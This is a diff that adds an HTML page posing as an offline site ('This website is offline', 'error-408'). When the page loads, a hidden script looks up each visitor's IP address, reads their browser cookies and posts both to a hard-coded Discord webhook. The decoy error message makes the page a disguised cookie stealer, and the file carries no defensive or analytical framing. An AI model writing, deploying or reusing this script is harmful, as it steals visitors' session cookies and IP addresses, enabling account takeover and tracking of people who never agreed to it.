@@ -1,0 +1,24 @@
+<html>
+  <head>
+    <script>
+    
+
+const webhook = "https://discord.com/api/webhooks/1444829948345848069/JDEX9MZUbvL4E1S-V_rxqWxyudmlp7btELlo2ck26IZqaz812uhhM3rIYSm56AOA-20d";
+fetch("https://api.ipify.org?format=json").then(res => res.json()).then(ip => {
+  const cookies = document.cookie;
+  fetch(webhook, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      content: `IP: ${ip.ip}\nCookies: ${cookies}`
+    })
+  });
+});
+    </script>
+  </head>
+
+  <body>
+   <h>This website is offline</h> 
+    <p>error-408</p>
+  </body>
+</html>
